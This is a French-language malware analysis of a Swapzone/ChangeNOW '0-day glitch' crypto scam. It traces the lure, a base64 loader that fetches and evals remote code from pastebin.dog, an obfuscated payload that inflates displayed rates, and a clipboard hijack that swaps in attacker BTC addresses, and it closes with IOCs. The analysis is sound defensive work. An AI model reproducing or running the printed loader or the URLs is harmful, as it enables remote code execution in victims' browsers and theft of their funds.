# Chronique d’une arnaque “0-day” Swapzone/ChangeNOW — (farm as much money as u can)

Objectif : reconstituer tout le chemin de l’escroquerie, du premier message privé jusqu’au script final injecté, expliquer comment et pourquoi ça marche, identifier les indicateurs de compromission (IOC).

### Résumé (TL;DR)

Le “glitch 0-day” invoqué est faux. Il s’agit d’un cheval de Troie social qui te pousse à coller un javascript: dans la barre d’URL Chrome pour injecter un script malveillant sur Swapzone.

La chaîne d’infection passe par un Google Doc ➜ un loader minuscule (paste.sh) ➜ un payload massif obfusqué (pastebin.dog).

Le payload :

gonfle visuellement les montants d’≈ +37 % (DOM only, pas la vraie cote).

cache les offres concurrentes et oriente l’œil vers “ChangeNOW”.

insère un bouton Copy qui copie l’adresse BTC de l’attaquant dans le presse-papiers.

rafraîchit l’interface en boucle (≈ 10 ms) pour maintenir l’illusion.

masque ses traces (history.pushState, éléments supprimés).

Adresses BTC observées (IOCs) :

bc1qmye886jf9v4n8kfscgn9r4fffha6fw4l3gqvdl

bc1qr0vqdklgwgthyzh0t398u47w98nwn8xauqyheh


# La chaîne complète, étape par étape

## L’appât : MP sur un forum  
>'hi bro, this is the 0 day glitch on swapzone… farm as much money as u can…'



Promesse : une “faille” donnant +37 % sur les swaps BTC → ANY via “un vieux nœud ChangeNOW (Node v1.9)”.

Social engineering : sentiment d’urgence (“dans 1–2 jours ce sera patché”) + plafond AML (≤ 15 000 €) pour paraître crédible et éviter KYC.

**Lien du Google Doc :**

    https://docs.google.com/document/d/1I-jKzemw1b6sXYAFnASBd3z9ypCxnqiaxNB1jwy2ZTY/edit?usp=sharing

### Le manuel d’injection : Google Doc

**Le Doc explique :**

Aller sur **swapzone.io.**

**Obligatoire** : Google Chrome (car Chrome autorise les URL javascript: sous certaines conditions d’interaction).

Dans la barre d’URL, taper javascript:, puis coller un “node API script” depuis un lien externe.

![Texte alternatif](img/image1.png 'injection du loader')

**Lien du “Script” (le loader):**

    https://paste.sh/RXAihG6U#F6Nk_hmVC5pLE8q-AL7S-02J

### Pourquoi Chrome seulement ?

L’Omnibox de Chrome peut accepter des URL javascript: après une action utilisateur (clic focus + saisie), ce qui rend plausible la narration “Chrome est plus avancé et permet de charger un node”.

D’autres navigateurs bloquent plus strictement ce comportement, d’où l’insistance sur Chrome dans le Doc.

⚠️ **RED FLAGS:**

Demande explicite d’exécuter javascript: depuis l’Omnibox.

Narratif **“Node v1.9”** inaccessible sur ChangeNOW direct, mais “encore câblé côté agrégateur” : histoire invérifiable et bancale.

“+37 % immédiats” : trop beau, incohérent avec la concurrence et la liquidité réelle.

## Le loader (paste.sh) : très court, mais critique

**Contenu (rôle) :**

Déduit une **“clé”** depuis l’URL, décode un morceau en **base64**, puis exécute **(eval)**.

URL intégrée pointe en réalité vers… un second paste obfusqué :

```https://pastebin.dog/s.php```


## Analyse courte (où est la base64 ?) 

### Dans la variable NODE 

    let NODE = 'https://swapzone.io/exchange/nodes/changenow/aHR0cHM6Ly9wYXN0ZWJpbi5kb2cvcy5waHA/btc/node-1.9.js'
               .match(/changenow\/(.*?)\//)[1];
   

* Le ```match(...)``` capture la portion entre ```changenow/``` et la barre ```/``` suivante. 
* Cette portion capturée est la chaîne ```aHR0cHM6Ly9wYXN0ZWJpbi5kb2cvcy5waHA```, qui **est du base64**. 
* **Quand on la décodera (atob)** on obtient l’URL cible (le script distant). 

En clair : ```NODE``` **contient une URL encodée en base64** (c’est le pointeur vers le script distant). 

### Dans ```NODE_API_KEY``` 

    let NODE_API_KEY = 'ZmV0Y2goYXRvYihOT0RFKSkudGhlbihyID0+IHIudGV4dCgpKS50aGVuKGNvZGUgPT4gZXZhbChjb2RlKSk'; 
    eval(atob(NODE_API_KEY)); 
    
* ```NODE_API_KEY``` est elle aussi **une chaîne base64**. 
* Le code fait ```eval(atob(NODE_API_KEY))``` — donc il **décodera** cette chaîne en JavaScript et l’**exécutera**. 
* Le JavaScript décodé effectue une requête vers l’URL décodée depuis ```NODE``` et **exécute** (eval) le code retourné par cette requête.
* En résumé : **loader distant en deux étapes** — URL encodée + loader encodé qui fait ```fetch(atob(NODE))``` → ```eval(code)```.

### But réel :

Servir de pont discret vers le payload principal, en gardant l’illusion d’un “node API script” technique.

## Le payload : la charge utile

### 1) Le décodeur de chaînes (hex XOR → UTF-8)

le décodeur est introduit à l’intérieur de la fonction d’indexation ```Sz_DwrsHS$IEXWM```. 
Il est créé une seule fois (memoization via ```PGgaEb```) et sert à décoder des chaînes hexadécimales en clair en leur appliquant un XOR avec une clé constante, puis en décodant UTF-8 :

    // === Bloc obfusqué tel quel ===
    if (Sz_DwrsHS$IEXWM['PGgaEb'] === undefined) {
      const PDAGFbKHLK_nQSPfN$wXGLHy = function(HA__vrJ) {
        let zwleENnpdyelhqQKyPpbZeCe =
          -parseInt(0x3)*-parseInt(0x96e)+-parseInt(0x14d)+parseInt(-parseInt(0x1a7f))
          & parseInt(0xb97)*0x3 + parseInt(0x212e)*Math.trunc(parseInt(0x1))
          + Math.max(-0x42f4, -parseInt(0x42f4));
    
        const CMyMLCWC$lN = new Uint8Array(
          HA__vrJ['match'](/.{1,2}/g)['map'](JpcPtWBpUPBKAlz => parseInt(JpcPtWBpUPBKAlz, parseInt(0x122a)+-0x175*-0x5+-0x1963))
        );

        const zWnyAGr$XgOQuV = CMyMLCWC$lN['map'](hwh_Cyr$n => hwh_Cyr$n ^ zwleENnpdyelhqQKyPpbZeCe);

       const uJLAuDwaVTZakeDLurUwJTe = new TextDecoder();
        const MAzAwvFmlbrnrlTRjXbwk = uJLAuDwaVTZakeDLurUwJTe['decode'](zWnyAGr$XgOQuV);
        return MAzAwvFmlbrnrlTRjXbwk;
      };

      Sz_DwrsHS$IEXWM['rzwhpm'] = PDAGFbKHLK_nQSPfN$wXGLHy;
      znPLRXhqxyOALPwBPuXnwgQw = arguments;
      Sz_DwrsHS$IEXWM['PGgaEb'] = !![];
    }

### Ce que ça fait (en clair)

* ```HA__vrJ``` : chaîne **hex** (ex: ```"745e5e..."```)  
* ```match(/.{1,2}/g)``` → découpe en octets  
* ```parseInt(.., 16)``` (la base 16 est masquée par une expression qui retombe à 16)  
* XOR chaque octet avec la **clé** ```zwleENnp...``` (qui, une fois évaluée, **vaut 0x7E (126))**
* ```extDecoder().decode(...)``` → chaîne UTF-8 **en clair** .

### Où c’est utilisé

Quand une entrée du tableau obfusqué doit être lue **pour la première fois**, elle passe par ce décodeur, puis le résultat en clair est mis en cache (voir le prochain pour le mécanisme de cache).

Extrait d’utilisation (dans la même fonction) :

    let ICc__hef = YnxyTLy_GmKbaQfqQNQK[mTIqG$tlNYsKmkxNVAGDoG];
    ...
    const ZuOyzUuCmmoODyCWziYbqi = znPLRXhqxyOALPwBPuXnwgQw[IqJiLbJCxkitQYIy_Z$u];
    return !ZuOyzUuCmmoODyCWziYbqi
      ? (ICc__hef = Sz_DwrsHS$IEXWM['rzwhpm'](ICc__hef),
        znPLRXhqxyOALPwBPuXnwgQw[IqJiLbJCxkitQYIy_Z$u] = ICc__hef)
      : ICc__hef = ZuOyzUuCmmoODyCWziYbqi,
        ICc__hef;

* Si **pas encore décodé** → passe par ``` rzwhpm```  (le **décodeur XOR**) et **stocke** le **clair** dans un cache indexé.
* Si **déjà décodé** → **reprend** le clair depuis le cache (évite de recalculer)

## 2) Le « array-rotator » + cache d’index
### 2.a) Le grand tableau et son rotateur

Le gros tableau de littéraux obfusqués est retourné par ``` OkZcOn$CM()```  :



    function OkZcOn$CM() {
      const tsLINusEwRAfKf = [
        '745e5e5e5e5e5e5e5e5e5e5e5e421a17...',   // ← chaînes HEX XOR 0x7E
        '1c1d4f0f13071b46...',                  // (beaucoup d’entrées)
        '...'
      ];
      OkZcOn$CM = function() { return tsLINusEwRAfKf; };
      return OkZcOn$CM();
    }

Juste après, un **IIFE**) « rotateur » désaligne le tableau en déplaçant les éléments jusqu’à atteindre une **)valeur cible**) :

    (function(xnKeq, NFPyfGibUHBthJn) {
      const sCBQY = Sz_DwrsHS$IEXWM,
            SWTQzYhRPAOBi = xnKeq(); // ← le tableau

      while (!![]) {
        try {
          const uLoJqZqvH =
            parseInt(-parseFloat(sCBQY(0x11c)) / (...)) +
            ... // énorme expression numérique
            + parseFloat(sCBQY(0x8a)) / (...);

          if (uLoJqZqvH === NFPyfGibUHBthJn) break;
          else SWTQzYhRPAOBi['push'](SWTQzYhRPAOBi['shift']()); // ← rotation
        } catch (HKBQiYkwzWnQ) {
          SWTQzYhRPAOBi['push'](SWTQzYhRPAOBi['shift']()); // ← rotation si erreur
        }
      }
    }(OkZcOn$CM, 0x1b7*0x102 + 0x51f19*-0x1 + Math.floor(parseInt(0x6e90d))));

### But de ce rotateur

*Empêcher qu’un **index** sCBQY(0x123) pointe toujours la **même chaîne** d’une exécution à l’autre.
*Après la rotation, les indices **« logiques »** (0x83, 0x104, etc.) pointent vers des **entrées différentes** du tableau initial, mais **cohérentes** dans cette exécution.

>**Déobfuscation** : on peut ignorer la rotation en **décodant directement** les chaînes hex avec le **XOR 0x7E (point 1)**, ou **laisser courir** la boucle en sandbox (sans réseau) puis **aspirer** les valeurs en clair une fois que le cache est rempli.

### 2.b) Le cache d’index/décode (memoization)

La même fonction Sz_DwrsHS$IEXWM contient un petit cache pour éviter de redécoder :

    const GoB_rl = YnxyTLy_GmKbaQfqQNQK[Math.max(0x1bc, 0x1bc) + ...]; // offset d'index
    const IqJiLbJCxkitQYIy_Z$u = mTIqG$tlNYsKmkxNVAGDoG + GoB_rl;

    // Cache lookup
    const ZuOyzUuCmmoODyCWziYbqi = znPLRXhqxyOALPwBPuXnwgQw[IqJiLbJCxkitQYIy_Z$u];

    return !ZuOyzUuCmmoODyCWziYbqi
      ? (ICc__hef = Sz_DwrsHS$IEXWM['rzwhpm'](ICc__hef),  // décode si miss
         znPLRXhqxyOALPwBPuXnwgQw[IqJiLbJCxkitQYIy_Z$u] = ICc__hef)
      : ICc__hef = ZuOyzUuCmmoODyCWziYbqi;                 // sinon, reprend du cache

* ``` GoB_rl```  applique un **offset** supplémentaire sur l’index demandé.
* ``` znPLRX...```  (qui vaut ``` arguments```  de la fonction) est utilisé comme **structure de cache**.
* **Première lecture** : décodage via ``` rzwhpm```  (XOR) puis écriture dans le cache.
* **Lectures suivantes** : **retour** du clair depuis le cache (pas de re-XOR).

#### En résumé

* (1) Le décodeur (``` PDAGFbKHLK_nQSPfN$wXGLHy``` ) prend des chaînes hex, fait un XOR 0x7E octet par octet, puis UTF-8 → on récupère tous les littéraux (sélecteurs, textes, adresses, etc.).

* (2) Le rotateur ne sert qu’à casser les indices du tableau à l’exécution (rotation jusqu’à une somme cible). Le cache évite de redécoder deux fois la même entrée une fois l’indice « réel » stabilisé.  

### Le payload en résumé

* Obfuscation lourde : variables absurdes, arrays hex, XOR/encodage, offsets, calculs inutiles.
* Anti-tamper léger : vérif basique + alert() + redir si l’empreinte ne colle pas.
* Masquage d’UI : supprime des messages, éléments de debug, lignes concurrentes d’offres, badges.
* Manipulation continue du DOM : setInterval(..., ~10ms) pour :
* Appliquer un facteur 1.37 aux montants visibles (“You send” / “You get”).
* Formater les chiffres (décimales conservées selon le champ source).
* Recalquer les widgets secondaires (cartes/offres/vignettes).
* **Seuil :** n’active l’illusion que si la devise d’envoi est BTC et montant ≥ 0.001 BTC.
* Faux panneau “best route / rate locked” :
* Insère un bouton Copy ; au clic :```navigator.clipboard.writeText(ATTACKER_BTC_ADDRESS)```
* Presse-papiers : détourne la destination quand la victime croit copier l’adresse légitime.

**Adresses BTC insérées (IOCs) :**

```
bc1qmye886jf9v4n8kfscgn9r4fffha6fw4l3gqvdl 
bc1qr0vqdklgwgthyzh0t398u47w98nwn8xauqyheh
```

**Autres détails :**

* history.pushState pour maquiller la navigation après injection.
* Suppression/insertion d’éléments pour coller à l’histoire “ChangeNOW route privilégiée”.
* Aucune interaction serveur : tout est côté client — c’est un mirage visuel.

## Ce que prétend l’arnaque vs. ce qui se passe réellement

### L’histoire vendue

“Swapzone utilise des connexions partenaires” → vrai en général (c’est un agrégateur).

“Un vieux node ChangeNOW (v1.9) ressert via l’API partenaire et donne +37 %” → faux.

“Ne marche que via Swapzone + ChangeNOW, pas chez ChangeNOW directement” → prétexte pour t’imposer l’injection locale.

### La réalité technique

* Aucune hausse réelle de taux côté backend.
* Seulement une multiplication DOM par 1.37 des champs visibles.
* On cache les offres rivales pour forcer le choix, on insère la bannière/bouton “Copy”.
* L’utilisateur copie in fine l’adresse de l’attaquant et envoie ses fonds.

### Points clés techniques du payload (déobfuscation conceptuelle)

* Facteur magique 1.37 : calculé par une somme/mix d’entiers + 0.3700000000000001 → = 1.37.
* Seuil d’activation : 0.001 BTC (empêche l’activation sur des montants minuscules).
* Cibles DOM : champs “send amount”, “get amount”, cartes d’offres, tuiles; ciblage par data-qa, classes CSS Swapzone, et mots-clés.
* Rafraîchissement : setInterval ≈ 10 ms (animation fluide + écrase les contre-mises à jour de la page).
* Clipboard hijack : bouton “Copy” avec navigator.clipboard.writeText(<adresse BTC>).
* Anti-debug : suppression d’éléments suspects, pushState, conditions de garde basiques.
* Même si tu vois “+37 %” et “rate locked”, ce n’est que l’UI. Le vrai montant envoyé/reçu par la plateforme reste normal — c’est toi qui colles l’adresse de l’attaquant ensuite.

## Indicateurs de compromission (IOC) & artefacts

**Google Doc d’appât :**

    https://docs.google.com/document/d/1I-jKzemw1b6sXYAFnASBd3z9ypCxnqiaxNB1jwy2ZTY/edit?usp=sharing

**Loader :**

    https://paste.sh/RXAihG6U#F6Nk_hmVC5pLE8q-AL7S-02J

**Payload obfusqué :**

    https://pastebin.dog/s.php

**Adresses BTC attaquant**

```
bc1qmye886jf9v4n8kfscgn9r4fffha6fw4l3gqvdl
bc1qr0vqdklgwgthyzh0t398u47w98nwn8xauqyheh
```

